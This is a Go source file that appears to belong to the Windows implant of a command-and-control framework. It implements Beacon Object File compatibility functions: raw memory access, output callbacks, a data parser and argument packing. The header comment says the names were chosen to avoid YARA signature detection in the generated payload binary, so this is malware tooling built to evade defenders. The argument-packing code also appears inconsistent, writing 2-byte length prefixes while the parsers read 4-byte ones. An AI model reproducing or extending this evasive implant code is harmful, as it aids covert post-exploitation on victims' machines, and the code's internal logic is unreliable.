// server/docker/payloads/Windows/lighthouse.go
//go:build windows
// +build windows

/*
	Our Beacon* Function Compatibilty implementations. Code here is taken very liberally
    from Ne0nd0g's go-coff project at https://github.com/Ne0nd0g/go-coff.

	Beacon function names are signatured to hell and back in yara land so this package is
    called "lighthouse" to avoid the presence of beacon/BOF strings in the generated binary.
    Function names have also been replaced/reduced along to avoid detection.
*/

package main

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"strconv"
	"unicode/utf16"
	"unsafe"
)

// Helper functions for reading memory
func ReadBytesFromPtr(ptr uintptr, size uint32) []byte {
	if ptr == 0 || size == 0 {
		return nil
	}

	result := make([]byte, size)
	for i := uint32(0); i < size; i++ {
		result[i] = *(*byte)(unsafe.Pointer(ptr + uintptr(i)))
	}
	return result
}

func ReadUIntFromPtr(ptr uintptr) uint32 {
	if ptr == 0 {
		return 0
	}
	return *(*uint32)(unsafe.Pointer(ptr))
}

func ReadShortFromPtr(ptr uintptr) uint16 {
	if ptr == 0 {
		return 0
	}
	return *(*uint16)(unsafe.Pointer(ptr))
}

func CopyMemory(dst uintptr, src uintptr, size uint32) {
	for i := uint32(0); i < size; i++ {
		*(*byte)(unsafe.Pointer(dst + uintptr(i))) = *(*byte)(unsafe.Pointer(src + uintptr(i)))
	}
}

// Beacon output functions
func GetCoffOutputForChannel(channel chan<- interface{}) func(int, uintptr, int) uintptr {
	return func(beaconType int, data uintptr, length int) uintptr {
		fmt.Printf("[DEBUG BeaconOutput] Called with type=%d, length=%d\n", beaconType, length)

		if length <= 0 {
			fmt.Printf("[DEBUG BeaconOutput] Length is zero or negative\n")
			return 0
		}

		out := ReadBytesFromPtr(data, uint32(length))
		outStr := string(out)

		fmt.Printf("[DEBUG BeaconOutput] Output: %s\n", outStr)

		// CRITICAL: Add to global buffer for async BOF monitoring
		bofOutputMutex.Lock()
		bofOutputBuffer = append(bofOutputBuffer, out...)
		currentBufferSize := len(bofOutputBuffer)
		bofOutputMutex.Unlock()

		fmt.Printf("[DEBUG BeaconOutput] Added %d bytes to global buffer (total: %d bytes)\n",
			length, currentBufferSize)

		// Also send to channel if provided (for non-async BOFs)
		if channel != nil {
			select {
			case channel <- outStr:
				fmt.Printf("[DEBUG BeaconOutput] Also sent to channel\n")
			default:
				fmt.Printf("[DEBUG BeaconOutput] Channel full, skipped channel send\n")
			}
		}

		return 1 // Return success as uintptr
	}
}

func GetCoffPrintfForChannel(channel chan<- interface{}) func(int, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr) uintptr {
	return func(beaconType int, format uintptr, arg0 uintptr, arg1 uintptr, arg2 uintptr, arg3 uintptr, arg4 uintptr, arg5 uintptr, arg6 uintptr, arg7 uintptr, arg8 uintptr, arg9 uintptr) uintptr {

		if format == 0 {
			return 0
		}

		formatStr := ReadCStringFromPtr(format)

		// Count format specifiers properly (skip %%)
		numArgs := 0
		for i := 0; i < len(formatStr)-1; i++ {
			if formatStr[i] == '%' {
				if formatStr[i+1] != '%' {
					numArgs++
					i++ // Skip the format character
				} else {
					i++ // Skip %%
				}
			}
		}


		args := []uintptr{arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9}

		fString := ""
		argOffset := 0
		skipChar := false
		for i := 0; i < len(formatStr); i++ {
			c := formatStr[i]

			if skipChar {
				skipChar = false
				continue
			}

			if c == '%' && i < len(formatStr)-1 {
				d := formatStr[i+1]

				if d == '%' {
					// Escaped percent
					fString += "%"
					skipChar = true
					continue
				}

				if argOffset >= numArgs {
					// No more arguments
					fString += string(c)
					continue
				}

				// Debug the argument we're about to process

				switch d {
				case 's':
					// Try to read as a C string
					argPtr := args[argOffset]
					if argPtr == 0 {
						fString += "(null)"
					} else {
						// Debug: Check what's at this address
						firstBytes := make([]byte, 16)
						for j := 0; j < 16; j++ {
							firstBytes[j] = *(*byte)(unsafe.Pointer(argPtr + uintptr(j)))
							if firstBytes[j] == 0 {
								break
							}
						}

						s := ReadCStringFromPtr(argPtr)
						fString += s
					}
				case 'S': // Wide string
					s := ReadWStringFromPtr(args[argOffset])
					fString += s
				case 'd', 'i':
					fString += fmt.Sprintf("%d", int32(args[argOffset]))
				case 'u':
					fString += fmt.Sprintf("%d", uint32(args[argOffset]))
				case 'x':
					fString += fmt.Sprintf("%x", uint32(args[argOffset]))
				case 'X':
					fString += fmt.Sprintf("%X", uint32(args[argOffset]))
				case 'p':
					fString += fmt.Sprintf("0x%x", args[argOffset])
				case 'c':
					fString += string(byte(args[argOffset]))
				case 'l':
					if i+2 < len(formatStr) && formatStr[i+2] == 'l' {
						if i+3 < len(formatStr) && formatStr[i+3] == 'd' {
							// %lld - long long
							fString += fmt.Sprintf("%d", int64(args[argOffset]))
							i += 2
							skipChar = true
						}
					}
				case '0':
					// Handle %02d style formatting
					if i+3 < len(formatStr) && formatStr[i+2] >= '0' && formatStr[i+2] <= '9' {
						width := int(formatStr[i+2] - '0')
						if formatStr[i+3] == 'd' {
							fString += fmt.Sprintf("%0*d", width, int32(args[argOffset]))
							i += 2
							skipChar = true
						}
					}
				default:
					// Default formatting
					fString += fmt.Sprintf("%"+string(d), args[argOffset])
				}
				argOffset++
				skipChar = true
			} else {
				fString += string(c)
			}
		}

		fmt.Printf("[DEBUG BeaconPrintf] Formatted output: %s\n", fString)

		// CRITICAL: Add to global buffer for async BOF monitoring
		outputBytes := []byte(fString)
		bofOutputMutex.Lock()
		bofOutputBuffer = append(bofOutputBuffer, outputBytes...)
		bofOutputMutex.Unlock()

		// Also send to channel if provided (for non-async BOFs)
		if channel != nil {
			select {
			case channel <- fString:
			default:
			}
		}

		return 0 // Return success as uintptr
	}
}

// Data parser structure and functions
type DataParser struct {
	original uintptr
	buffer   uintptr
	length   uint32
	size     uint32
}

func DataExtract(datap *DataParser, size *uint32) uintptr {

	if datap.length <= 0 {
		return 0
	}

	binaryLength := *(*uint32)(unsafe.Pointer(datap.buffer))

	datap.buffer += uintptr(4)
	datap.length -= 4

	if datap.length < binaryLength {
		return 0
	}

	out := make([]byte, binaryLength)
	CopyMemory(uintptr(unsafe.Pointer(&out[0])), datap.buffer, binaryLength)

	if uintptr(unsafe.Pointer(size)) != uintptr(0) && binaryLength != 0 {
		*size = binaryLength
	}

	datap.buffer += uintptr(binaryLength)
	datap.length -= binaryLength

	// Log extracted string for debugging
	if binaryLength > 0 && binaryLength < 1000 {
		_ = string(out[:binaryLength-1]) // -1 to exclude null terminator if present
	}

	return uintptr(unsafe.Pointer(&out[0]))
}

func DataInt(datap *DataParser, size *uint32) uintptr {

	if datap.length < 4 {
		return 0
	}

	// Read length prefix first
	_ = *(*uint32)(unsafe.Pointer(datap.buffer))
	datap.buffer += uintptr(4)
	datap.length -= 4


	if datap.length < 4 {
		return 0
	}

	value := ReadUIntFromPtr(datap.buffer)
	datap.buffer += uintptr(4)
	datap.length -= 4

	return uintptr(value)
}

func DataLength(datap *DataParser) uintptr {
	return uintptr(datap.length)
}

func DataParse(datap *DataParser, buff uintptr, size uint32) uintptr {

	if size <= 0 {
		return 0
	}

	datap.original = buff
	datap.buffer = buff
	datap.length = size
	datap.size = size

	return 1
}

func DataShort(datap *DataParser) uintptr {

	if datap.length < 4 {
		return 0
	}

	// Read length prefix first
	_ = *(*uint32)(unsafe.Pointer(datap.buffer))
	datap.buffer += uintptr(4)
	datap.length -= 4


	if datap.length < 2 {
		return 0
	}

	value := ReadShortFromPtr(datap.buffer)
	datap.buffer += uintptr(2)
	datap.length -= 2

	return uintptr(value)
}

// Key-value store functions
var keyStore = make(map[string]uintptr, 0)

func AddValue(key uintptr, ptr uintptr) uintptr {
	sKey := ReadCStringFromPtr(key)
	keyStore[sKey] = ptr
	return uintptr(1)
}

func GetValue(key uintptr) uintptr {
	sKey := ReadCStringFromPtr(key)
	if value, exists := keyStore[sKey]; exists {
		return value
	}
	return uintptr(0)
}

func RemoveValue(key uintptr) uintptr {
	sKey := ReadCStringFromPtr(key)
	if _, exists := keyStore[sKey]; exists {
		delete(keyStore, sKey)
		return uintptr(1)
	}
	return uintptr(0)
}

// Argument packing functions
func PackArgs(data []string) ([]byte, error) {
	if len(data) == 0 {
		return nil, nil
	}

	var buff []byte
	for _, arg := range data {
		if len(arg) == 0 {
			continue
		}

		switch arg[0] {
		case 'b':
			data, err := PackBinary(arg[1:])
			if err != nil {
				return nil, fmt.Errorf("Binary packing error:\n INPUT: '%s'\n ERROR:%s\n", arg[1:], err)
			}
			buff = append(buff, data...)
		case 'i':
			data, err := PackIntString(arg[1:])
			if err != nil {
				return nil, fmt.Errorf("Int packing error:\n INPUT: '%s'\n ERROR:%s\n", arg[1:], err)
			}
			buff = append(buff, data...)
		case 's':
			data, err := PackShortString(arg[1:])
			if err != nil {
				return nil, fmt.Errorf("Short packing error:\n INPUT: '%s'\n ERROR:%s\n", arg[1:], err)
			}
			buff = append(buff, data...)
		case 'z':
			var packedData []byte
			var err error
			// Handler for packing empty strings
			if len(arg) < 2 {
				packedData, _ = PackString("")
			} else {
				packedData, err = PackString(arg[1:])
				if err != nil {
					return nil, fmt.Errorf("String packing error:\n INPUT: '%s'\n ERROR:%s\n", arg[1:], err)
				}
			}
			buff = append(buff, packedData...)
		case 'Z':
			var packedData []byte
			var err error
			if len(arg) < 2 {
				packedData, _ = PackWideString("")
			} else {
				packedData, err = PackWideString(arg[1:])
				if err != nil {
					return nil, fmt.Errorf("WString packing error:\n INPUT: '%s'\n ERROR:%s\n", arg[1:], err)
				}
			}
			buff = append(buff, packedData...)
		default:
			return nil, fmt.Errorf("Data must be prefixed with 'b', 'i', 's','z', or 'Z'\n")
		}
	}

	// Don't add the total length prefix here - arguments are passed individually
	return buff, nil
}

func PackBinary(data string) ([]byte, error) {
	hexData, err := hex.DecodeString(data)
	if err != nil {
		return nil, err
	}
	// Use 2-byte length prefix
	buff := make([]byte, 2)
	binary.LittleEndian.PutUint16(buff, uint16(len(hexData)))
	buff = append(buff, hexData...)
	return buff, nil
}

func PackInt(i uint32) ([]byte, error) {
	// BOFs expect: 2-byte length prefix + 4-byte value
	buff := make([]byte, 6)
	binary.LittleEndian.PutUint16(buff[:2], 4) // Length of int is 4
	binary.LittleEndian.PutUint32(buff[2:], i)
	return buff, nil
}

func PackIntString(s string) ([]byte, error) {
	i, err := strconv.ParseUint(s, 10, 32)
	if err != nil {
		return nil, err
	}
	return PackInt(uint32(i))
}

func PackShort(i uint16) ([]byte, error) {
	// BOFs expect: 2-byte length prefix + 2-byte value
	buff := make([]byte, 4)
	binary.LittleEndian.PutUint16(buff[:2], 2) // Length of short is 2
	binary.LittleEndian.PutUint16(buff[2:], i)

	fmt.Printf("[DEBUG PackShort] Value: %d, Output: %x\n", i, buff)
	return buff, nil
}

func PackShortString(s string) ([]byte, error) {
	i, err := strconv.ParseUint(s, 10, 16)
	if err != nil {
		return nil, err
	}
	return PackShort(uint16(i))
}

func PackString(data string) ([]byte, error) {

	// FIX: Convert patterns to Windows format
	if data == "." {
		data = ".\\*"
	} else if data == ".*" {
		data = ".\\*"
	}
	// If it's just "*", leave it as is

	// Include null terminator
	stringBytes := append([]byte(data), 0)

	// Use 2-byte length prefix for BOF compatibility
	result := make([]byte, 2+len(stringBytes))
	binary.LittleEndian.PutUint16(result[:2], uint16(len(stringBytes)))
	copy(result[2:], stringBytes)

	fmt.Printf("[DEBUG PackString] Output: %d bytes, hex: %x\n", len(result), result)
	return result, nil
}

func convertToWindowsUnicode(s string) []byte {
	runes := []rune(s)
	utf16Encoded := utf16.Encode(runes)
	buf := make([]byte, len(utf16Encoded)*2)
	for i, utf16Char := range utf16Encoded {
		binary.LittleEndian.PutUint16(buf[i*2:], utf16Char)
	}
	return buf
}

func PackWideString(s string) ([]byte, error) {
	d := convertToWindowsUnicode(s)
	// Use 2-byte length prefix
	buff := make([]byte, 2)
	binary.LittleEndian.PutUint16(buff, uint16(len(d)+2)) // Include null terminator
	buff = append(buff, d...)
	buff = append(buff, 0x00, 0x00) // Wide string null terminator
	return buff, nil
}
